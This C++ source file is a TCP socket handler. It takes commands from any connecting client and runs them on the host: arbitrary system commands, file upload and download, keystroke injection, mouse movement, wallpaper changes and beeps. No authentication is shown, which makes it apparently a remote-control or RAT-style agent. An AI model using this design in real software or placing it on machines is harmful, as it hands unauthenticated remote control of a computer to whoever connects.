#include "system/handler.hpp"

void Handler::prepare() noexcept {
    m_command.clear();
    m_command.resize(64);
    mp_data->m_size = 0;
    mp_data->m_type.clear();
    mp_data->m_type.resize(5, '\0');
    mp_data->m_data.clear();
}

boost::asio::awaitable<void> Handler::processSocket(tcp::socket *_p_socket) noexcept {
    std::string ip { _p_socket->remote_endpoint().address().to_string() };
    OUTPUT("New connection: " << ip, FOREGROUND_GREEN)
    try {
        while (true) {
            co_await read(_p_socket);
            OUTPUT("\n[ " << ip << " ]: " << m_command.data(), FOREGROUND_GREEN)
            if (!strcmp(m_command.data(), "client_send")) {
                co_await Reader::receive(_p_socket, mp_data);
                co_await System::writeInFile(mp_data);
            }
            else if (!strcmp(m_command.data(), "server_send")) {              
                co_await Writer::send(_p_socket, co_await System::readOutFile());
            }
            else if (!strcmp(m_command.data(), "input")) {
                co_await read(_p_socket);
                co_await System::input(m_command.data());
            }
            else if (!strcmp(m_command.data(), "cmd")) {
                co_await read(_p_socket);          
                co_await System::command(m_command.data());
            }           
            else if (!strcmp(m_command.data(), "wallpaper")) {
                co_await read(_p_socket);          
                co_await System::wallpaper(m_command.data());
            }
            else if (!strcmp(m_command.data(), "mouse")) {
                co_await read(_p_socket);
                co_await System::setMousePosition(m_command.data());
            }
            else if (!strcmp(m_command.data(), "beep")) {
                co_await read(_p_socket);
                co_await System::beep(m_command.data());
            }
        }
    }
    catch (const std::exception &e) {
        std::cerr << '\n' << e.what() << "\n\n";
    }

    OUTPUT("Lost connection: " << ip << '\n', FOREGROUND_RED)
    _p_socket->shutdown(boost::asio::socket_base::shutdown_both);
    _p_socket->close();
    delete _p_socket;
}
